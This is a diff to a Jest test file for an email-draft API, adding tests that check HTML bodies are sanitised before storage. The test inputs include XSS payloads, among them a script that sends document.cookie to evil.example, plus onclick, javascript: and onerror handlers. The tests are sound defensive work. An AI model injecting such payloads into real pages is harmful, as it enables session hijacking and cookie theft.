@@ -441,8 +441,17 @@ describe('PATCH /api/email/orgs/:orgId/drafts/:draftId', () => {
     expect(prismaMock.emailDraft.deleteMany).not.toHaveBeenCalled()
   })
 
-  it('stores bodyHtml byte for byte, without reformatting it', async () => {
-    const body = '<div>Hi Ann,</div><div><br></div><div>  spaced   &amp; &lt;kept&gt;</div>'
+  // Rule changed on purpose in MAI-78 (EC-12). This test used to read "stores
+  // bodyHtml byte for byte, without reformatting it" and used `<div>` wrappers.
+  // The route now runs the body through the allow-list in lib/sanitizeHtml.ts,
+  // so `<div>` is unwrapped and the old assertion no longer describes the code.
+  // What survives of the original rule — and what actually mattered — is that
+  // the route does not REFORMAT: it never re-indents, never collapses the rep's
+  // spacing, and never re-escapes an entity. Only markup that is not on the
+  // allow-list is removed. See the "bodyHtml is sanitised before it is stored"
+  // block at the foot of this file for the sanitising half.
+  it('stores allowed markup byte for byte, without reformatting it', async () => {
+    const body = '<p>Hi Ann,</p><p><br /></p><p>  spaced   &amp; &lt;kept&gt;</p>'
     prismaMock.emailDraft.findFirst.mockResolvedValue(draftRow({ bodyHtml: body }))
 
     const res = await request(app).patch(ONE_A).set('Authorization', AUTH).send({ bodyHtml: body })
@@ -633,5 +642,98 @@ describe('a draft is private to its author — 404, never 403', () => {
 
     expect(res.status).toBe(404)
     expect(res.body.error).toBe('Draft not found')
+  })
+})
+
+// ============================================================
+// The sanitiser is WIRED IN (MAI-78 / EC-12)
+// ============================================================
+// `server/src/lib/__tests__/sanitizeHtml.test.ts` proves the allow-list itself
+// blocks the attacks. These prove the write path actually calls it — which is
+// the half that silently regresses, because a sanitiser nothing imports still
+// passes all of its own tests.
+//
+// The assertion is on what reaches PRISMA, not on what comes back in the
+// response. What is stored is what gets rendered later; the response is read by
+// nobody, because the card owns its own text while it is open
+// (vite/src/hooks/email/useUpdateEmailDraft.ts).
+describe('bodyHtml is sanitised before it is stored', () => {
+  it('PATCH strips a <script> from the body on its way into the database', async () => {
+    await request(app)
+      .patch(ONE_A)
+      .set('Authorization', AUTH)
+      .send({ bodyHtml: '<p>Hi Ann</p><script>fetch("//evil.example?c="+document.cookie)</script>' })
+
+    const stored = prismaMock.emailDraft.updateMany.mock.calls[0][0].data.bodyHtml
+    expect(stored).toBe('<p>Hi Ann</p>')
+  })
+
+  it('PATCH strips an event handler and a javascript: href, keeping the rep’s words', async () => {
+    await request(app)
+      .patch(ONE_A)
+      .set('Authorization', AUTH)
+      .send({
+        bodyHtml:
+          '<p style="color:red" onclick="alert(1)">Quote</p>' +
+          '<a href="javascript:alert(1)">terms</a>',
+      })
+
+    const stored = prismaMock.emailDraft.updateMany.mock.calls[0][0].data.bodyHtml as string
+    expect(stored).toBe('<p>Quote</p><a>terms</a>')
+    expect(stored.toLowerCase()).not.toContain('javascript')
+    expect(stored).not.toContain('onclick')
+    expect(stored).not.toContain('style')
+  })
+
+  it('PATCH leaves formatting the rep is allowed to use byte for byte', async () => {
+    const html = '<p>Hi <strong>Ann</strong></p><ul><li><em>one</em></li></ul>'
+
+    await request(app).patch(ONE_A).set('Authorization', AUTH).send({ bodyHtml: html })
+
+    expect(prismaMock.emailDraft.updateMany.mock.calls[0][0].data.bodyHtml).toBe(html)
+  })
+
+  it('PATCH still stores an explicit null — clearing the body is a real edit', async () => {
+    await request(app).patch(ONE_A).set('Authorization', AUTH).send({ bodyHtml: null })
+
+    expect(prismaMock.emailDraft.updateMany.mock.calls[0][0].data).toEqual({ bodyHtml: null })
+  })
+
+  it('PATCH does not touch bodyHtml when the body did not carry it', async () => {
+    // Sanitising must not become a reason to write a key the caller left out —
+    // that would blank a half-written email every time a card is collapsed.
+    await request(app).patch(ONE_A).set('Authorization', AUTH).send({ isMinimized: true })
+
+    expect(prismaMock.emailDraft.updateMany.mock.calls[0][0].data).not.toHaveProperty('bodyHtml')
+  })
+
+  it('POST sanitises too, because a composer opened from a record lands with a body', async () => {
+    const res = await request(app)
+      .post(URL_A)
+      .set('Authorization', AUTH)
+      .send({ bodyHtml: '<p>Hi</p><img src=x onerror="alert(1)">' })
+
+    expect(res.status).toBe(201)
+    expect(prismaMock.emailDraft.create.mock.calls[0][0].data.bodyHtml).toBe('<p>Hi</p>')
+  })
+
+  it('POST with no body still stores null, not an empty string', async () => {
+    await request(app).post(URL_A).set('Authorization', AUTH).send({})
+
+    expect(prismaMock.emailDraft.create.mock.calls[0][0].data.bodyHtml).toBeNull()
+  })
+
+  it('re-saving what the server already stored changes nothing', async () => {
+    // Autosave sends the body dozens of times per email. A sanitiser that
+    // mangled its own output would corrupt a draft one keystroke at a time.
+    const first = '<p>Hi <strong>Ann</strong></p><a href="https://acme.example" target="_blank">x</a>'
+
+    await request(app).patch(ONE_A).set('Authorization', AUTH).send({ bodyHtml: first })
+    const once = prismaMock.emailDraft.updateMany.mock.calls[0][0].data.bodyHtml as string
+
+    await request(app).patch(ONE_A).set('Authorization', AUTH).send({ bodyHtml: once })
+    const twice = prismaMock.emailDraft.updateMany.mock.calls[1][0].data.bodyHtml as string
+
+    expect(twice).toBe(once)
   })
 })
